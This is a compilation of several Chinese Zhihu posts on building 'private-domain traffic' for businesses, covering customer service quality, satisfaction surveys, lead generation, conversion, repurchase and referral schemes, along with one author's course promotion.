如果你对这个服务都不满意了，试想你还愿意再购买此品牌的产品吗？ 好的响应速度是对别人的尊重，对别人时间的尊重，客户只有得到尊重了，客户才会尊重你的产品，尊重你的品牌，己所不欲勿施于人，既然你都不愿意等，别人又岂会愿意？ 第二、私域服务之专业度 这个也是在私域服务里经常会出现的问题，就是客服在回答客户问题的时候不够专业，这个太致命了。 这种不专业给客户带来的负面情绪会延申到企业的产品，企业的管理层，企业的文化。客户有理由怀疑，你的客服这么不专业，想必是管理层教导无方，没有把客服培训好，鉴于这么无能的管理层，又怎么能够做出好的产品，好的企业文化来呢？ 此等分析，言之有物，言之有理。正所谓，上梁不正下梁歪，客服是服务客户的一线执行者，是私域服务的基本盘，如果连客服都不专业，又怎么能获得客户的满意呢？ 所以，我们作为私域的负责人，一定要做好客服专业知识的培训，不仅要培训，还要进行演练以及知识答辩考试等。 现在的chatgpt很火，能够快速的回答客户的问题，但是机器毕竟是机器，谁又愿意和一个机器对话，所以与其训练chatgpt，还不如好好的培训自己的客服人员。 与人交谈，才能获得真正的情绪价值。 第三、私域服务之满意度 做服务一定避不开一个词，那就是客户的满意度。除了要站在管理者的角度去思考服务之外，我们还要懂得站在客户的角度去思考问题。 只有当用户真正的满意，那么服务才能取得好的结果。 所以做满意度调查表对于私域服务来说是很有必要的，自己人说自己人好不算好，要客户亲自说好才算是真的好。 做一份满意度问卷调查需要注意以下几个问题： 1.选择制作满意度调查问卷的软件，最好选择正规的大平台，而且不能有广告，这样未免让用户产生厌烦。 2.满意度调查的问题最好都是选择题，最后一题可以为填空题：您的意见和建议是什么？而且题目不能太长，不能太多，最好在10道题以内。 3.客户填好满意度调查表之后，为了表示感谢，最好可以赠送一个小的礼品，别人帮了你有一个回赠，才会显得你比较懂得感恩、大气。 满意度调查是为了收集服务中产生的问题，进而不断的优化服务意识以及服务态度，有则改之，无则加勉。 第四、私域服务之细节处理 私域服务在我看来都是一件件小的事情，小的不能再小，就因为事小，所以很多人都会不自觉的忽略或者是不用心，总觉得就这么点小事，客户应该不会在意吧？ 正所谓，勿以善小而不为，勿以恶小而为之。 小事都处理不好，又怎么能放心把大事交给你来处理。很多人就是手低眼高，小事看不上，大事做不好。像这类型的人就不适合做私域服务，很容易出问题。 能够做好私域服务的人要胆大心细，注重细节，力求把任何一个细节都处理好，心思缜密，眼疾手快。 第五、私域服务之意识和态度 服务意识和服务态度并非一朝一夕的事情，而是要经过不断的学习，不断的磨练才能培养出好的服务意识和态度。 何谓好的服务意识，就是能够想在用户的前面。当用户还没有问的时候，你就已经替用户解决了问题。 例如，我们在给客户发包裹的时候，要检查包括里面的东西是否齐全，说明书有没有放，螺丝刀有没有放。 何谓好的服务态度，润物细无声，清风拂山岗，让别人觉得很舒服，就是好的服务态度，而不是咋咋呼呼的，说话像开机关枪一样，满嘴跑火车。 最后，好的服务要可以给用户带来一定的情绪价值。 情绪价值这个词，被现在越来越多人提及，前段时间歌手李玟因抑郁症自杀去世，让更多的人不得不正视情绪的问题。 在未来，给用户提供情绪价值会是一门不错的生意，而服务跟情绪价值息息相关，所以未来的私域要更加的重视服务，不仅要做好，还要做出特色来，做出创意来，要有敢为天下先的气势。 《孙子兵法》军争第七章里说道，是故朝气锐，昼气惰，暮气归。 私域之于服务亦是如此，好的服务就是朝气，正所谓一日之计在于晨，可以让人如沐春风，如鱼得水。不好的服务就是暮气，让客户衰竭，没有心气，又怎么能让用户满意？ 所以从今天开始，好好规划一下你的私域服务应该怎么做吧。 未来的私域，是体验的私域，是服务的私域，得体验者得用户，得服务者得用户，得用户者得市场，此乃才是私域的正道所在啊！ 文章详细url:https://api.zhihu.com/articles/659302112私域流量是什么？品牌为什么要做私域？如何做好私域？内容作为10余年私域流量运营者，来分享几点关于私域流量的看法，与其说是看法，还不如说是纠正5个误区。 首先，还是来普及一下概念：私域流量是基于公域流量而言，指的是所有你能够快速、主动、低成本触达的流量。比如：基于我们微信朋友圈、自主开发的小程序和APP、视频号等私域平台上的用户总称。 而公域流量指的是在第三方流量平台上所有客户总称，比如：淘宝、百度、知乎、小红书等各种大平台上的用户。 明白这两个概念后，我们来看一下大部分人对于私域流量存在的误区有哪些？ 先说第一个：私域流量=微商？不断发广告？ 看完这篇文章后，请别再这么认为，会让人笑掉大牙。 为什么这么说呢？ 这就得先明确我们建立私域流量的目的是什么，按我个人的说法，更喜欢把私域流量称之为私域体系，而不是纯粹基于流量的角度来理解用户和我们的行为。 我们建立私域体系的目的，应该是为了更好服务客户，让他们在购买我们产品和服务后，有任何问题都能快速找到服务人员，并反馈给我们。 以快速、准确解决客户疑问为第一要素，其次在服务的过程中传递企业价值，并挖掘客户深层次消费需求。在后期服务过程中，实现客户多次消费的目的。 而朋友圈推送广告，私发消息激活等类微商行为，都只能归类为其中一种刺激和触达客户的方式。它并非私域流量的全貌。以后有机会，会慢慢与大家分享如何在不伤害客户体验的方式下，多次触达客户。 接下来讲讲第二个：私域流量=见缝插针似的加好友？ 近几年，常常能见到，地铁上、商超里、大路边，都有人做扫码加好友，送礼品的活动。也能在一些群里，会莫名其妙的被人私加好友。 所以也就会认为私域流量不就是到处加好友吗？ 如果这样操作私域流量的话，你得小心哦！可能当你一天主动加了20来个好友，就会被腾讯盯上，离警告和封号也就不远了…… 其实开篇在解释私域流量的时候，或许你也有注意到，这同样是一种基于三方平台的行为，也就意味着，这件事想长久做，就必须去研究规则。 什么是平台的规则？ 拿微信来举例子：你知道一个微信每天不间断主动加好友20个以上，会被限制行为吗？你知道频繁群发信息给联系人会被限制使用朋友圈和群发功能吗？你知道同一根网线上，一旦有一个微信号被封了，其余微信号也有被封的风险吗？ 这只是简单讲几个规则，同样的，在知乎、小红书、淘宝等这种公域平台，又有哪些规则？也是要去研究的。 见缝插针似的加好友，是私域流量中最Low的玩法！ 不仅效果最差，还风险最高，产能最低，成本最高！ 那，私域流量是如何保证在各种规则中寻得一方立足之地呢？ 简而言之就是：引导！ 在所有平台上，都只能是引导！无论是线上还是线下，通过各种内容、礼品、实物等，引导客户主动添加我们的微信个人号。 这是需要一系列策略来支撑的，也是整个私域体系建立过程中相当核心的部分。 看到这里，你对于私域流量应该有了初步认识，知道这是一套系统工程，不是我们之前想当然的认知。 那就再来看看第三个：私域流量=从很多公域到单个私域？ 这种说法，可以说对，但又不全对。 正如我在前面有提到，私域流量与其叫做流量，不如叫做体系。 整个体系分为：流量体、承载体、转化体、循环体。当然，我们实际上解释了流量题和承载体，比如：百度、知乎、小红书、淘宝等全部属于流量体。通过在各种流量体上分享内容，引导精准流量主动触发加好友的机制，进入我们的承载体。 所以，承载体就可以简单理解为：微信个人号、公众号、视频号、社群等各种能够快速触达的平台。 而转化体，这里也必须带一下。毕竟，我们之所以做私域流量，肯定不是为了做公益、做慈善，本质上还是希望做商业、做生意。 也就意味着，所有承载体上的用户，最终都需要通过转化体来完成商业变现，哪怕是卖土特产，也能比别人多卖好几种产品给同一个客户。 要实现卖多个产品给同一个客户的目的，对于私域体系的要求就会更高！ 我们需要建立的是一个私域矩阵，同一个客户，在各种不同的承载体上，我们最后触达这个客户的频次会更多，也就意味着客户转化的概率在加大。 那么在私域体系建立过程中，绝不是简单的将一个客户承载在一个私域平台。而是要通过一系列策划，将客户引导到尽量多的平台上去。 还有一个更奇葩的误区，包括我自己在日常工作中，也会经常听到这种谬论。比如：我们公司只有几个人，没办法做私域流量。 为什么私域流量是大公司的专利？而不是所有商业体的通识做法？ 大公司有大公司的私域流量，小公司有小公司私域流量的做法。 有一句话，你之前也听过：维护好一个老客户，胜过开发10个新客户。 私域流量放在所有公司而言，首先应该是客户维护工具。在维护客户过程中，吸引客户再次消费，以及带来新客户转介绍。 从这个维度去理解，就能明白，私域流量并无公司大小之分，只要你启动了，就永远不晚。 怕就怕你永远不出发…… 最后，再谈一个误区，也算是深学邦刘一一给教育从业者一个转型建议：并不是只有公司才能做私域流量，在人人都是自媒体，人人都是一个品牌的年代，私域流量也是属于每一个人的。 个体如何做私域流量？ 需要评估2个维度： 一是你能为哪些用户可持续创造什么价值？ 一是你有什么能力可以辅助你完成这种价值输出？ 第一个问题，是关于自我私域流量定位的问题，实际上也是个人IP打造的范畴。 公域平台上的流量，既大，又广，且多。与你个人能力匹配的流量是谁？他们对什么感兴趣？目前市面上主流的内容是什么？我们又该如何另辟蹊径…… 与用户相关的问题搞懂了之后，你就基本上确定私域流量的方向。 第二个，是关于价值输出呈现方式的问题。文字OR视频？短视频OR长网课？等，既跟个人长期习惯有关，也跟所掌握的技能有关。 有人擅长写作，有人擅长演讲，有人擅长做视频……具体哪种呈现方式，都是由自身基本技能决定的。这也是你能够长期坚持的基本要求。 私域流量，或者说私域体系的建立，是一项长期工程！在整个过程中，会有很多的失落，因为我们需要独自面对漫长的静默期。 很多时候，你每天都在做价值输出，但回应者寥寥，而我们依然要坚持。 所以，从大部分人来讲，把私域流量当做全职事业来做，并不是好的选择。如果有空余精力，当做副业来做还是可以考虑的。 另外，当下的企业，如果还没有启动私域流量体系建立，接下去可能会越来越难！毕竟，随着人口红利的消失，获客成本必然会越老越高，且转化率会越来越低。 移动互联网时代，人人都有发声的机会！ 只要你想把握发声机会，且通过发声变现。私域流量的红利，请勿错过！（刘一一，10年引流、文案、私域、变现经验，6年专注知识付费实操，擅长私域体系建立和个人IP打造，\\/X：sxblyy02） 搭建私域流量，只需要看这篇文章就够了！接下来进入正题：如果要用一句话来概括私域流量的话，那就是：借助一些平台和工具，持续做好引流和服务，最终实现低成本获客、高频率转化、高收益创造和多频次转介绍的一套思想体系！ 注意！私域流量应该是一套思想体系，而不是简单的单点模式。在整个过程中，会涉及到的主要核心点有5个：引流、成交、复购、转介绍和裂变。明白这5个环节之间的关系，就基本上解决了企业（或个人）打造私域体系的链路难点问题。当然，对于很多个人想做私域流量来讲，也必须把自己当做一家企业，这个话题，会在以后跟大家详细拆开来阐述。对于5个核心要点之间，存在什么样的关系？这才是你所重点关注的。引流顾名思义，就是吸引流量。在互联网时代，流量在哪里？我们拿教育行业来举例子，做过市场的朋友会很清楚，我们经常会去小区、学校门口、商超里做地推，通过派送小礼品吸引客户来添加个人微信或留下联系方式。这个链路拆开来就是：公域、诱饵、资源。小区、学校等可以理解为公域流量池；小礼品自然就是诱饵了，而个人微信和联系方式，可以认为是私域池和资源。流量的第一种来源就清楚了，那就是很多很多的公域流量池。比如：知乎、小红书、简书、搜狐自媒体等。而基于私域流量范畴，还有第二种流量来源，我们也可以叫做精准流量来源。依旧拿机构来举例子，我们所有的转介绍客户、直接上门客户、邀约上门未签约客户，实际上都可以认为是精准流量，这些客户，如果仅仅停留在手机号码层面，还不能叫做私域流量。必须把每个手机号转化为微信个人号上的好友，微信公众号上的关注，才能算是进入了我们内部的私域流量体系。解释完这两种来源后，你应该就很清楚。引流就是通过将公域流量和线下门店精准流量转换为私域平台上的一种做法。如何让用户愿意进入我们预设的轨道当中去？就需要我们精心设计流量用户感兴趣的“诱饵”。可以是顾客刚需使用的物品，也可以是一篇有深度的文章，还可以是一系列实用的电子档学习资料……当然，除了这两种常用引流方法以外，还有一些企业会通过付费投放、渠道资源置换、社群加人等方式去引流。流量的吸引和获取，只是完成了私域体系建立的第一步！但也是最关键的一步。产品、流量，是一门生意能够存在的两大关键要素。之所以做私域流量，也是为了使更多低成本获取的流量实现源源不断的成交。成交什么是成交？你的产品（可以是实物，也可以是服务）被你的顾客购买，这就叫做成交！做流量不是为了成交，那还不如将钱投入公益慈善事业 。但要做好成交，也不是这么容易。毕竟，流量离成交还有很长一段距离。这段距离用一个词来概括就是：信任问题。一切成交的基础都是源于信任，这是互联网营销中不变的法则！所以，一切成交的实现，都是在解决信任问题，只要解决了信任问题，成交也就是顺水推舟的事情。也可以这么认为，不购买可以等同于不信任。在之前的文章里有提到过“客户触达”的话题，将客户引导到越多的私域承载体上，理论上来讲，企业触达客户的频次也会越高，成交的概率也会随之增加。这是私域体系能够在信任问题解决上的第一个优势。其次，因为我们将客户承载在不同地方，而每个地方都有一种内容输出和成交方式。比如微信个人号成交，可以有朋友圈静默转化、一对一私聊成交、社群发售转化，每种成交方式的方法和技巧都有所不同。就拿我一个朋友的朋友圈来举例子：他的微信朋友圈，内容非常丰富且多样，有专业知识、实事热点解读、营销广告、产品推介、生活感悟等。这些既是为了做价值输出，也是为了打造个人IP，同时也是解决信任完成成交。除了日常内容维护之外，还有一些基础配套，是我们需要做好的。比如：你的微信昵称辨识度高吗？好友一看就能明白你是做什么的？微信背景作为一个很好的广告位，你有用起来吗？微信上的一句话介绍自己，你还是写着心灵鸡汤吗？当我们去做好这些工作的时候，完成基本成交是没有问题的。但这远远不够……复购成交需要解决信任，复购才能使企业永续存在。一家企业如果没有复购，可以说离死亡也就不远了。复购的好处有很多，比如降低运营成本、优化营销费用、提高单体消费金额等，但还有一个更重要的好处是：客户对企业品牌形象和产品服务的认可。基于私域体系，客户能够复购的前提有两个，一是我们在成交阶段解决的信任问题，一是企业必须建立强大且专业的产品矩阵。这也是大部分私域流量运营者不愿意对外透露的秘密！就如一家餐厅，如果只有一道菜，客户哪怕愿意复购，也会在二三次后离去。而如果你的餐厅里有10道菜，客户能够复购的次数可能是8次、10次……私域流量体系的建立，只是让我们能够更高频、更多次触达客户，而产品矩阵的建立，才是每一位私域流量运营者要去考虑的核心中的核心。产品矩阵这个话题，后期会单独用几篇文章来阐述，这里就不做过多的展开。每一套较为成熟的私域流量体系，都必须能够解决：引流、成交和复购三大环节。转介绍与裂变转介绍和裂变，大部分私域玩家会当做是终局，但我个人更愿意理解为锦上添花！也就意味着，这两者的实施与否，既要考虑流量用户的功能充分挖掘，更需要考虑转介绍和裂变实施过程中的成本与风险把控。所以，这两个模块就放在一起讲讲。转介绍，也可以理解为是一种粉丝的精准裂变。而大面积的裂变，我们会习惯性的认为是1-100、1000、10000的过程，事实上，从1-3-5-8也是一种裂变，只是裂变过程中引发的膨胀效果并没那么大而已。简单的说，裂变也是一种转介绍。客户愿意转介绍的前提也可以归纳为两种，一是用户使用你的产品或服务后，感觉特别好，那么他就会向其他用户进行转介绍。还有一种是，因为你给了用户一定的利益驱动，他自发的分享到朋友圈或其他更多的社群。但转介绍能够触发的核心还是产品和服务过关，其余的都是锦上添花的做法。同样的，为什么做私域流量要重视转介绍和裂变？因为它们可以带来更多的客户，同时还能降低引流成本。当然，因为有口碑价值的输出，也能方便我们快速完成成交。在整个体系中，要做好转介绍和裂变，需要重点做好4个维度的工作。一是产品和服务交付过程中的专业度及细致度；二是企业内部产品矩阵建立时的客群定位延展度；三是小型转介绍和大型裂变过程中的传播路径设计和激励机制建立；四是每次裂变时的风险把控（如：触发封号风险、传播频次把控、加群上限处理等）和结果反馈机制。作为私域体系中的内部再生循环系统，也是私域流量体系中最容易触发风险的一环，在不深入专研各个平台内部规则的情况下，不是太建议去尝试。一旦被封号，得不偿失！什么意思呢？私域流量的前面3个步骤，实际上只要把握一个核心要素：企业被动，客户主动。只要是客户主动添加我们，在大部分情况下是不会触发风险机制。而在裂变过程中，由于实施者本身对各个平台的规则研读不清楚，很容易在毫无知觉的情况下引发封号风险。综合以上内容，我们能够发现：私域流量体系的建立，本质上与实施者的身份无关。不管是老板还是员工，都可以踊跃尝试。尤其是在互联网获客成本越来越高的当下，谁具备低成本获取流量的方法，谁就占有先机！如果能够看懂这篇文章，你做私域流量体系的底层思维就不缺！剩下的就是入局尝试！（刘一一，10年引流、文案、私域、变现经验，6年专注知识付费实操，擅长私域体系建立和个人IP打造，\\/X：sxblyy02） 文章详细url:https://api.zhihu.com/answers/3111709445如何看待公域流量和私域流量？内容1.公域流量和私域流量是什么意思公域流量指商家直接入驻平台实现流量转换，比如大家熟悉的拼多多、京东、淘宝、饿了么等，以及内容付费行业的喜马拉雅、知乎、得到等公域流量平台。私域流量是指从公域（internet）、它域(平台、媒体渠道、合作伙伴等)引流到自己私域（官网、客户名单），以及私域本身产生的流量(访客)。私域流量是可以进行二次以上链接、触达、发售等市场营销活动客户数据。私域流量和域名、商标、商誉一样属于企业私有的经营数字化资产。 早在17、18年的时候，很多互联网公司已经感觉到增量到顶了，要想维持公司的增长势头，有两条路，要么获得新用户，要么让老用户的价值发挥的更大，在流量红利殆尽的当下，挖掘老用户更多的价值成为了所有公司的共识，于是私域流量的概念开始流行起来。私域是指运营客户的能力已经成为企业和品牌最核心的能力之一。 在数字经济时代，企业的核心目标是要从产权的高度上真正去重视和拥有“客户”这个最有价值的资产，并不断提升自己为每个客户创造更丰富价值的能力。从字面理解，公域流量就是流量公共所有，私域流量就是流量私人所有。 2.私域流量和公域流量的区别 （1）竞争程度不同：公域流量竞争很大，比如淘宝，同一类型产品可能有几十上百个同行竞争。但私域流量只属于商家自己，没有同行竞争。 （2）留存度不同：公域流量池里面由于选择较多，用户比较难以留存，客户很容易流失；但私域流量客户只对接你一人，你还能通过自己的系统来精细化运营，这样留存度较高，粉丝黏性更强。 （3）运营方向不同：一般来说，当我们运营公域流量时，考虑的是尽可能抓住更多红利流量，以此来扩大粉丝基数；但是在私域流量当中，主要考虑的就是怎么样去保我的流量，同时获得用户更高深度的资产，也就是从用户中获取更多利润。 （4）转化方式不同：公域流量通常需要通过投放或者是推广来进行获客，而如今流量是不可控的，有时候广告投放效果很差，转化也不好；而私域流量就不同了，当用户被沉淀到我们自己的系统后，之后的活动曝光，通知，营销，会员卡，下单等，均可以通过我们自己的系统实现，无需再投入大量广告费用来争取公域流量中竞争激烈的客户。总之，相对于高投入的公域流量，经营私域流量可以让商家达到降低运营成本，提高利润的目的。公域和私域流量区别很大，如果你想提升客户黏性，增加复购率，那么就需要好好积攒私域流量了。 3.私域流量的特点 （1）.获取难度，取决于你的公域流量来源，譬如你的淘宝店铺、京东、拼多多、线下门店以及你的抖音、微博，日常的老客户和粉丝积累，决定你的私域流量汇聚难度。 （2）粘性高，拿私域流量的典型代表——微信好友来说，只要一个客户是我的微信好友，我就可以通过发消息、发朋友圈的手段，将我的信息自由、反复、稳定的传递给他（当然，被拉黑就不是私域流量了）。但是想要添加到很多精准的客户很难，毕竟谁都不想自己的微信充斥着太多的商业因素。所以，微商随之诞生。微商就是让普通人，变成微商品牌的分销商。而每个人都会有自己已有的私域流量（亲朋好友），所以这些微商分销商就能够通过自己已有的私域流量，直接进行营销信息的传递。 文章详细url:https://api.zhihu.com/answers/3145499736私域落不了地，怎么办？内容你敢相信吗？通过活动运营打通私域存量增长，帮助中小企业单项目变现近千万。虽然大家都在讨论私域，真正做成项目拿到结果的主要还是头部企业偏多。对于大部分中小企业，想做好私域并不是件容易的事情。 方法总比困难多。营销工作十年，经历大大小小近200+项目，都是在“遇到问题-解决问题”的过程中间渡过的。也经历了不少周期，搜索引擎时代、“两微一抖”，形式也从图文到短视频、直播。 如果从一线业务执行落地的角度来看，真正能穿越周期的都是底层能力，也就是硬技能。像文案、活动策划、数据分析等。其中，我比较专注在活动运营这个板块的研究，因为它的综合性更强。 一、私域存量增长三大体系 2018年之后，我开始专注研究企业私域存量增长。也拿到过一些结果，帮助过头部金融公司单项目变现过亿，创业型公司单项目变现近千万。 结合在私域存量增长中的实践，我将私域存量运营归纳为三个体系。 第一个是活动运营体系。活动既能实现品牌曝光，也能促进销售转化，达到“品效合一”的效果。借助活动运营，可以实现平台的用户拉新、留存、促活到付费转化全流程。活动运营也是日常运营工作中的重要抓手。 第二个是内容运营体系。内容的影响是潜移默化的。“洛阳纸贵”、“一字千金”这些成语也说明了好内容从古至今都有着极高的传播力和影响力。 私域环境当中的IP打造也离不开内容。IP通过不断的内容输出，不局限文字、图片、视频或者音频等方式，在私域存量用户心目中树立人设形象。干货内容可以体现IP自身的专业度，轻松愉快的内容分享则体现IP的另一面。干湿结合，会让IP人设更加立体有温度。 第三个是社群运营体系。社群作为私域用户的运营工具，在社群内部可以输出内容和活动信息。通过群公告等方法，传递企业的促销活动，通知全员消息，输出日常打卡活动内容。是与客户沟通的重要桥梁。 内容、活动、社群三个体系之间相互关联，共同促进私域存量增长。 二、用心做好课，不求快，要足够扎实 这不是我第一次研发活动运营类课程，不同于过往的课程开发，这次周期最长，打磨最为严格。近三年，开发跟活动运营相关的课程，逐字稿累计30余万字。 专业团队做专业的事，“课程打磨-&gt;内容试讲-&gt;直播内测-&gt;正式录制”。课程制作从3月份开始提上日程，直到7月份才完成全部制作。 （1）课程打磨 课程制作，最难的部分就是框架结构的设计。既要考虑到专业知识的结构化梳理，也要照顾到用户的学习体验。 我自己本人也是深度学习用户，花费在学习上面的费用也不少。有些课程质量不错，我会做笔记复盘思考；有些课程质量虽然不好，但是我也会看下课程框架结构。一直以来，我对知识付费的理解，好的课程内容是可以解惑答疑的，但也很考验讲师的功力。 现在回过头来看这门课程好像没什么。128页PPT，4万多字，课时近3小时。但是为了打磨好每一句话，优化好课程内在逻辑结构，搜集实战项目素材，前后花费将近4个月。一门课只讲一件事，讲透能落地最重要。 （2）内容试讲 常规课程研发没有这个环节，这次是额外增加的。课程初稿打磨结束之后，为了保证接下来的直播效果，进行了一次演练，其实就是模拟直播讲课的场景。 内容试讲环节可能要比直播更严格，全程一个人对着电脑屏幕空讲。不像直播，学员还可以提问有互动。 内容试讲需要讲师对PPT以及课程内容非常熟悉，一次性讲完所有内容。为了保证试讲效果，需要提前做好充分准备。安静的场地，避免杂音和打扰；足够喝的水，过程中间润润嗓子。当然试讲结束之后，还需要做下复盘总结，不足的地方需要在后面的直播当中避免。需要做好每个细节。 （3）直播内测 在课程正式录制之前，进行了一次MVP（Minimum Viable Product，最小可行产品）打造。直播内测需要做好提前预热，2周不到的时间，社群小范围内招募了100位付费学员。 考虑到大部分学员的上下班时间，开播节点选择晚上。如果不能及时参加直播，也可以观看直播回放。直播过程中，比较关键的环节是穿插问题互动；直播结束之后，也做了问卷调查。针对学员提出的一些新问题，及时补充到课程当中。 市场是最好的老师，这也是做直播内测的目的。通过学员的反馈，快速迭代产品，小步快跑，做好产品的优化。 （4）正式录制 课程录制是件大事。找场地（安静封闭）、设备调整（保证视频画质）、情绪状态都很关键。辛辛苦苦做好的课程，要用最好的状态呈现出来。 这门课程内容录制将近5个多小时。录制前基本是在试镜头，找角度，声音测试，一切准备就位后才正式录制。额外分享一个小妙招，借助提词器可以提高录课效率。 欲速则不达。课程总共21小节，采取的方法是分批录制。每完成一个视频录制，再进入下一步。这么做虽然花费较多时间，但可以清晰管理视频素材，做好素材的命名和备份，也能让自己休息调整下状态。 三、持续深耕，不忘来时路 1厘米宽，1万米深。无论追求学问，还是做企业经营，要有钻研精神。 自己做项目拿结果只是单向的，教会更多的人才能创造更大的价值。我开始只是业余时间零散的写项目复盘，发布到业内专业平台。后来，不少头部职业教育公司找到我，开始尝试系统梳理自己的项目经验。把这些非常实操的专业技能做成系统的培训课程，借助平台的势能帮助有过同样困惑的年轻人。 （课程购买页面） 每门课程制作都是一次学习过程。从开始的新手期，做课显得稚嫩。到现在有点做课经验，会更加从听课人的视角来梳理内容。好的有价值的课程是一件作品，不仅能帮助你答疑解惑，也是一次心灵的碰撞。 回归初心，制作课程的目的是希望帮助到更多从业者，能够更加高效的做好项目，拿到结果。 四季轮回，大美不言。做企业项目十年，无论以后路走多远，未曾忘记来时的路。 如果觉得课程有所帮助，欢迎推荐给你身边想要在私域存量项目中获得增长提升的小伙伴。 文章详细url:https://api.zhihu.com/answers/3217127749私域流量如何打造？为什么要做私域流量？内容如何快速建立自己的私域流量底层逻辑， 只需要看这篇文章就够了！ 接下来进入正题： 如果要用一句话来概括私域流量的话，那就是：借助一些平台和工具，持续做好引流和服务，最终实现低成本获客、高频率转化、高收益创造和多频次转介绍的一套思想体系！ 注意！私域流量应该是一套思想体系，而不是简单的单点模式。 在整个过程中，会涉及到的主要核心点有5个：引流、成交、复购、转介绍和裂变。明白这5个环节之间的关系，就基本上解决了企业（或个人）打造私域体系 的链路难点问题。 当然，对于很多个人想做私域流量来讲，也必须把自己当做一家企业，这个话题，会在以后跟大家详细拆开来阐述。 对于5个核心要点之间，存在什么样的关系？ 这才是你所重点关注的。 引流 顾名思义，就是吸引流量。 在互联网时代，流量在哪里？ 我们拿教育行业来举例子，做过市场的朋友会很清楚，我们经常会去小区、学校门口、商超里做地推，通过派送小礼品吸引客户来添加个人微信或留下联系方式。 这个链路拆开来就是：公域、诱饵、资源。小区、学校等可以理解为公域流量池；小礼品自然就是诱饵了，而个人微信和联系方式，可以认为是私域池和资源。 流量的第一种来源就清楚了，那就是很多很多的公域流量池。比如：知乎、小红书、简书、搜狐自媒体等。 而基于私域流量范畴，还有第二种流量来源，我们也可以叫做精准流量来源。 依旧拿机构来举例子，我们所有的转介绍客户、直接上门客户、邀约上门未签约客户，实际上都可以认为是精准流量，这些客户，如果仅仅停留在手机号码层面，还不能叫做私域流量。 必须把每个手机号转化为微信个人号上的好友，微信公众号上的关注，才能算是进入了我们内部的私域流量体系。 解释完这两种来源后，你应该就很清楚。引流就是通过将公域流量和线下门店精准流量转换为私域平台上的一种做法。 如何让用户愿意进入我们预设的轨道当中去？就需要我们精心设计流量用户感兴趣的“诱饵”。可以是顾客刚需使用的物品，也可以是一篇有深度的文章，还可以是一系列实用的电子档学习资料…… 当然，除了这两种常用引流方法以外，还有一些企业会通过付费投放、渠道资源置换、社群加人等方式去引流。 流量的吸引和获取，只是完成了私域体系建立的第一步！但也是最关键的一步。 产品、流量，是一门生意能够存在的两大关键要素。 之所以做私域流量，也是为了使更多低成本获取的流量实现源源不断的成交。 成交 什么是成交？ 你的产品（可以是实物，也可以是服务）被你的顾客购买，这就叫做成交！ 做流量不是为了成交，那还不如将钱投入公益慈善事业 。 但要做好成交，也不是这么容易。毕竟，流量离成交还有很长一段距离。这段距离用一个词来概括就是：信任问题。 一切成交的基础都是源于信任，这是互联网营销中不变的法则！所以，一切成交的实现，都是在解决信任问题，只要解决了信任问题，成交也就是顺水推舟的事情。 也可以这么认为，不购买可以等同于不信任。 在之前的文章里有提到过“客户触达”的话题，将客户引导到越多的私域承载体上，理论上来讲，企业触达客户的频次也会越高，成交的概率也会随之增加。 这是私域体系能够在信任问题解决上的第一个优势。其次，因为我们将客户承载在不同地方，而每个地方都有一种内容输出和成交方式。 比如微信个人号成交，可以有朋友圈静默转化、一对一私聊成交、社群发售转化，每种成交方式的方法和技巧都有所不同。 就拿我一个朋友的朋友圈来举例子： 他的微信朋友圈，内容非常丰富且多样，有专业知识、实事热点解读、营销广告、产品推介、生活感悟等。 这些既是为了做价值输出，也是为了打造个人IP，同时也是解决信任完成成交。 除了日常内容维护之外，还有一些基础配套，是我们需要做好的。 比如：你的微信昵称辨识度高吗？好友一看就能明白你是做什么的？微信背景作为一个很好的广告位，你有用起来吗？微信上的一句话介绍自己，你还是写着心灵鸡汤吗？ 当我们去做好这些工作的时候，完成基本成交是没有问题的。 但这远远不够…… 复购 成交需要解决信任，复购才能使企业永续存在。 一家企业如果没有复购，可以说离死亡也就不远了。 复购的好处有很多，比如降低运营成本、优化营销费用、提高单体消费金额等，但还有一个更重要的好处是：客户对企业品牌形象和产品服务的认可。 基于私域体系，客户能够复购的前提有两个，一是我们在成交阶段解决的信任问题，一是企业必须建立强大且专业的产品矩阵。 这也是大部分私域流量运营者不愿意对外透露的秘密！ 就如一家餐厅，如果只有一道菜，客户哪怕愿意复购，也会在二三次后离去。而如果你的餐厅里有10道菜，客户能够复购的次数可能是8次、10次…… 私域流量体系的建立，只是让我们能够更高频、更多次触达客户，而产品矩阵的建立，才是每一位私域流量运营者要去考虑的核心中的核心。 产品矩阵这个话题，后期会单独用几篇文章来阐述，这里就不做过多的展开。 每一套较为成熟的私域流量体系，都必须能够解决：引流、成交和复购三大环节。 转介绍与裂变 转介绍和裂变，大部分私域玩家会当做是终局，但我个人更愿意理解为锦上添花！也就意味着，这两者的实施与否，既要考虑流量用户的功能充分挖掘，更需要考虑转介绍和裂变实施过程中的成本与风险把控。 所以，这两个模块就放在一起讲讲。 转介绍，也可以理解为是一种粉丝的精准裂变。而大面积的裂变，我们会习惯性的认为是1-100、1000、10000的过程，事实上，从1-3-5-8也是一种裂变，只是裂变过程中引发的膨胀效果并没那么大而已。 简单的说，裂变也是一种转介绍。 客户愿意转介绍的前提也可以归纳为两种，一是用户使用你的产品或服务后，感觉特别好，那么他就会向其他用户进行转介绍。 还有一种是，因为你给了用户一定的利益驱动，他自发的分享到朋友圈或其他更多的社群。 但转介绍能够触发的核心还是产品和服务过关，其余的都是锦上添花的做法。 同样的，为什么做私域流量要重视转介绍和裂变？ 因为它们可以带来更多的客户，同时还能降低引流成本。当然，因为有口碑价值的输出，也能方便我们快速完成成交。 在整个体系中，要做好转介绍和裂变，需要重点做好4个维度的工作。 一是产品和服务交付过程中的专业度及细致度； 二是企业内部产品矩阵建立时的客群定位延展度； 三是小型转介绍和大型裂变过程中的传播路径设计和激励机制建立； 四是每次裂变时的风险把控（如：触发封号风险、传播频次把控、加群 上限处理等）和结果反馈机制。 作为私域体系中的内部再生循环系统，也是私域流量体系中最容易触发风险的一环，在不深入专研各个平台内部规则的情况下，不是太建议去尝试。 一旦被封号，得不偿失！ 什么意思呢？ 私域流量的前面3个步骤，实际上只要把握一个核心要素：企业被动，客户主动。只要是客户主动添加我们，在大部分情况下是不会触发风险机制。 而在裂变过程中，由于实施者本身对各个平台的规则研读不清楚，很容易在毫无知觉的情况下引发封号风险。 综合以上内容，我们能够发现：私域流量体系的建立，本质上与实施者的身份无关。 不管是老板还是员工，都可以踊跃尝试。 尤其是在互联网获客成本越来越高的当下，谁具备低成本获取流量的方法，谁就占有先机！ 如果能够看懂这篇文章，你做私域流量体系的底层思维就不缺！ 剩下的就是入局尝试！ 另外，私域的整套体系，建议拿在自己手上，外人来做，不是很靠谱。 刚看到的一个提问：私域流量的作用是什么？我相信，不少朋友都有这样的疑问。 